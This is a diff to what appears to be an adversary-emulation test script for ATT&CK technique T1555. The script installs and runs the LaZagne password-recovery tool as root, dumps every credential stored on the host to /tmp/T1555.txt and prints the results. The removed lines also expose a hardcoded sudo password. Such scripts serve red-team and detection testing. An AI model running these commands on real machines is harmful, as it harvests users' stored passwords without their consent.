@@ -1,10 +1,10 @@
 ;
 #pre
-echo "010404grz" | sudo -S sh -c '((which yum && sudo yum -y install git zip python3-pip) || (which apt-get && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y git zip python3-pip))'
-pip install pyasn1 psutil Crypto
-cd /tmp; unzip LaZagne.zip; cd LaZagne-master; pip install -r requirements.txt
+echo "%password%" | sudo -S sh -c '((which yum && sudo yum -y install git zip python3-pip) || (which apt-get && sudo DEBIAN_FRONTEND=noninteractive apt-get install -y git zip python3-pip))'
+pip3 install pyasn1 psutil Crypto
+cd /tmp; unzip LaZagne.zip; cd LaZagne-master; pip3 install -r requirements.txt
 #command
-echo "010404grz" | sudo -S python3 /tmp/LaZagne-master/Linux/laZagne.py all > /tmp/T1555.txt
+echo "%password%" | sudo -S python3 /tmp/LaZagne-master/Linux/laZagne.py all > /tmp/T1555.txt
 #check
 echo "使用python3 laZagne.py all命令启动开源项目LaZagne的所有模块，用于检索存储在本机各种常用软件中的密码，并将结果保存到临时文件中："
 cat /tmp/T1555.txt
